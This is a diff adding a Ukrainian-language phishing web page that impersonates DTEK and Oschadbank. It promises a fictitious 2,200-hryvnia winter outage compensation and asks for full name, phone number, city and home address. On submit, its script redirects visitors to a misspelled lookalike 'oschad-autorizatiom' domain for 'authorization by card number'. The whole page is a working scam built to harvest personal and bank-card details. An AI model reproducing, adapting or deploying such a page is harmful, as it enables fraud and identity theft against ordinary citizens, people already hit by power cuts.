@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ДТЕК КОМПЕНСАЦІЯ</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        /* Сброс стилей */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            /* Градієнтний фон */
+            background: linear-gradient(
+                135deg,
+                #39e083 0%,   /* Зелений/Бірюзовий */
+                #ff99c4 50%,  /* Рожевий/Персиковий */
+                #b392f0 100%  /* Фіoлетовий */
+            );
+            /* Забезпечує заповнення всього екрану */
+            min-height: 100vh;
+            width: 100vw;
+            /* Встановлюємо позиціонування для body */
+            position: relative;
+            padding-bottom: 120px; /* Відступ знизу для кнопки */
+            font-family: 'Roboto', sans-serif; /* Використовуємо Roboto */
+        }
+
+        /* Контейнер для логотипа і тексту */
+        .logo-container {
+            position: absolute; /* Позиціонуємо відносно body */
+            top: 20px;          /* Відступ зверху */
+            left: 10px;         /* Відступ зліва */
+            display: flex;      
+            align-items: center; /* Вирівнювання елементів по вертикалі */
+            gap: 0;             /* Прибирає інтервал між flex-елементами */
+        }
+
+        /* Стиль для логотипів */
+        .logo-container img {
+            height: 50px; /* Розмір логотипа */
+            width: auto;  /* Зберігаємо пропорції */
+            margin: 0; 
+            padding: 0;
+        }
+        
+        /* Стиль для розділювача */
+        .logo-container .vertical-separator {
+            border-left: 2px solid #333; 
+            margin: 0 10px; /* Невеликі горизонтальні відступи */
+            height: 40px; /* Трохи менше, ніж логотип, для охайності */
+        }
+
+        /* Стиль для тексту поруч з логотипами */
+        .logo-text {
+            margin-left: 0; 
+            font-size: 18px; 
+            color: #333; 
+            font-weight: bold; 
+        }
+        
+        /* Стиль для лінії перед заголовком */
+        .separator-line {
+            position: absolute;
+            left: 10px;
+            top: 90px; /* Позиціонуємо над заголовком */
+            width: calc(100% - 20px); /* Ширина лінії */
+            border: none; 
+            border-top: 2px solid #333; 
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Стиль для нового заголовка */
+        .compensation-title {
+            position: absolute; 
+            left: 10px;
+            top: 110px; /* Розміщуємо під лінією */
+            font-size: 26px; 
+            font-weight: 900; 
+            color: #000; 
+            max-width: calc(100% - 20px); 
+            line-height: 1.3;
+        }
+        
+        /* Контейнер для тексту і нового логотипа */
+        .main-content-area {
+            position: absolute;
+            top: 240px; /* Відступ від заголовка */
+            left: 10px;
+            right: 10px;
+            display: flex; 
+            align-items: flex-start; 
+            gap: 20px; 
+            max-width: calc(100% - 20px);
+            box-sizing: border-box; 
+        }
+
+        /* Стиль для нового текстового блоку (компенсаційний текст) */
+        .compensation-body-text {
+            flex-grow: 1; 
+            font-size: 16px; 
+            font-weight: bold; 
+            color: #000; 
+            font-family: 'Roboto', sans-serif;
+            line-height: 1.4;
+        }
+
+        /* Стиль для списку */
+        .compensation-body-text ul {
+            margin-top: 10px;
+            margin-left: 20px;
+            list-style-type: disc; 
+        }
+        
+        /* Стиль для жирного підзаголовка всередині тексту */
+        .compensation-body-text strong {
+            font-weight: 900; 
+            color: #000;
+            display: block; 
+            margin-top: 10px;
+        }
+        
+        /* Стиль для нового логотипа справа */
+        .right-aligned-logo {
+            max-width: 120px; 
+            height: auto;
+            align-self: flex-start; 
+            margin-top: 10px; 
+        }
+        
+        /* --- ОНОВЛЕНІ СТИЛІ для КНОПКИ (Компактний стиль) --- */
+        .compensation-button {
+            position: fixed; 
+            bottom: 30px; 
+            left: 50%;
+            transform: translateX(-50%); 
+            width: 280px; /* Зроблено більш компактною */
+            padding: 12px 20px; /* Зменшено відступи */
+            
+            /* --- НОВИЙ ДИЗАЙН (Чорний) --- */
+            background-color: #000; /* Чорний фон */
+            color: #fff; /* Білий текст */
+            font-size: 16px; /* Трохи менший шрифт */
+            font-weight: 900; 
+            
+            text-align: center;
+            border: none; 
+            border-radius: 50px; 
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4); 
+            
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-decoration: none; 
+            z-index: 10; 
+        }
+        
+        .compensation-button:hover {
+            background-color: #333; 
+        }
+
+        /* --- Стили для МОДАЛЬНОГО ВІКНА (Стиль ДІЯ) --- */
+        .modal {
+            display: none; /* Приховано за замовчуванням */
+            position: fixed; 
+            z-index: 20; 
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.6); /* Темний фон */
+            backdrop-filter: blur(2px); 
+        }
+
+        .modal-content {
+            background-color: #fff; /* Білий фон */
+            margin: 10% auto; /* Центрування */
+            padding: 25px;
+            border: none;
+            width: 90%; 
+            max-width: 400px; 
+            border-radius: 20px; /* Більше заокруглення */
+            position: relative;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            animation-name: animatetop;
+            animation-duration: 0.4s;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        @keyframes animatetop {
+            from {top: -300px; opacity: 0}
+            to {top: 10%; opacity: 1} /* Змінено для кращого відображення */
+        }
+
+        .close {
+            color: #333; /* Чорний хрестик */
+            float: right;
+            font-size: 30px;
+            font-weight: 300; /* Тонший хрестик */
+            line-height: 20px;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: #000;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .modal-content h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 900;
+            color: #000;
+            text-align: left; /* Вирівнювання заголовка */
+        }
+
+        .modal-content label {
+            display: block;
+            margin-top: 15px;
+            margin-bottom: 5px;
+            font-weight: 700; /* Жирний шрифт для підписів */
+            font-size: 15px;
+            color: #333;
+        }
+
+        .modal-content input {
+            width: calc(100% - 2px); /* Ширина поля */
+            padding: 12px;
+            border: 1px solid #ddd; /* Світла рамка */
+            border-radius: 12px; /* Більш заокруглені поля */
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .modal-content input:focus {
+            outline: none;
+            border-color: #39e083; /* Зелена рамка при фокусі */
+        }
+
+        /* Кнопка в модальному вікні (Чорна, повністю заокруглена) */
+        .modal-submit-button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin-top: 30px;
+            background-color: #000; /* Чорний фон */
+            color: #fff; /* Білий текст */
+            font-size: 18px;
+            font-weight: 900;
+            border: none;
+            border-radius: 50px; /* Повністю заокруглена */
+            cursor: pointer;
+            transition: background-color 0.3s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-submit-button:hover {
+            background-color: #333;
+        }
+
+        /* Стиль для поля телефону з префіксом */
+        .phone-input-group {
+            display: flex;
+            align-items: center;
+        }
+        .phone-prefix {
+            padding: 12px;
+            background-color: #f7f7f7; /* Світліший фон префікса */
+            border: 1px solid #ddd;
+            border-right: none;
+            border-radius: 12px 0 0 12px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #555;
+            height: 46px; /* Вирівнювання по висоті з input */
+            line-height: 22px;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+        }
+        .phone-input {
+            width: 100% !important;
+            border-radius: 0 12px 12px 0 !important;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <img 
+            src="https://divi.iclub.energy/wp-content/uploads/2024/09/tild3931-3735-4235-b730-303466363765__dtek_01_1x.png" 
+            alt="Логотип ДТЕК"
+        ><span class="vertical-separator"></span><img 
+            src="https://i.postimg.cc/DwV7r4T9/oschadbank-logo-grey-1280x720-removebg-preview.png" 
+            alt="Логотип Ощадбанка"
+        >
+        
+        <span class="logo-text">Сервіс національних компенсацій</span>
+    </div>
+    
+    <hr class="separator-line">
+    <h1 class="compensation-title">Ощадбанк спільно з ДТЕК запустили зимову компенсацію у розмірі 2200 гривень</h1>
+    
+    <div class="main-content-area">
+        <div class="compensation-body-text">
+            <p>У разі глобальних відключень світла ДТЕК спільно з Ощадбанк запустили зимову компенсацію. Компенсацію отримають 3 100 000 Українців.</p>
+            <p>Заявки відкриті з 16.11.2025</p>
+            
+            <strong>Хто може отримати компенсацію:</strong>
+            <ul>
+                <li>подати заявку може кожен громадянин країни </li>
+                <li>подати заявку можуть тільки користувачі карток Ощадбанк</li>
+            </ul>
+            
+            <strong>Як отримати компенсацію:</strong>
+            <ul>
+                <li>натискаємо " Отримати компенсацію"</li>
+                <li>вказуємо:</li>
+                [ ПІБ ]
+                [ Номер телефону ]
+                [ Місто ]
+                [ Адреса ]
+                <li>проходимо авторизацію через Ощадбанк по номеру картки</li>
+            </ul>
+            <p>Розгляд заявки триває від 15хв до 48 годин</p>
+            </div>
+        <img src="https://i.postimg.cc/BbtffHW9/file-00000000598c720a87e250a9d194ccc5-removebg-preview.png" alt="Додатковий логотип" class="right-aligned-logo">
+    </div>
+
+    <button id="openModalBtn" class="compensation-button">ОТРИМАТИ КОМПЕНСАЦІЮ</button>
+
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Заповніть дані для компенсації</h2>
+            
+            <form id="compensationForm">
+                <label for="pib">ПІБ (Прізвище, Ім'я, По батькові):</label>
+                <input type="text" id="pib" name="pib" required>
+                
+                <label for="phone">Номер телефону:</label>
+                <div class="phone-input-group">
+                    <span class="phone-prefix">+380</span>
+                    <input type="tel" id="phone" name="phone" class="phone-input" pattern="[0-9]{9}" placeholder="XX XXX XX XX" required>
+                </div>
+
+                <label for="city">Місто:</label>
+                <input type="text" id="city" name="city" required>
+                
+                <label for="address">Адреса (Вулиця, будинок, квартира):</label>
+                <input type="text" id="address" name="address" required>
+
+                <button type="submit" class="modal-submit-button">Продовжити</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Отримуємо елементи модального вікна
+        var modal = document.getElementById("myModal");
+        var btn = document.getElementById("openModalBtn");
+        var span = document.getElementsByClassName("close")[0];
+        var form = document.getElementById("compensationForm");
+
+        // При кліку на кнопку відкриваємо модальне вікно 
+        btn.onclick = function() {
+            modal.style.display = "block";
+        }
+
+        // При кліку на хрестик (&times;) закриваємо модальне вікно
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+
+        // При кліку поза модальним вікном закриваємо його
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+
+        // Обробка відправки форми - ПЕРЕНАПРАВЛЕННЯ
+        form.onsubmit = function(event) {
+            event.preventDefault();
+            
+            // Перенаправляємо на вказаний сайт
+            window.location.href = "https://oschad-autorizatiom.onrender.com";
+        }
+    </script>
+</body>
+</html>
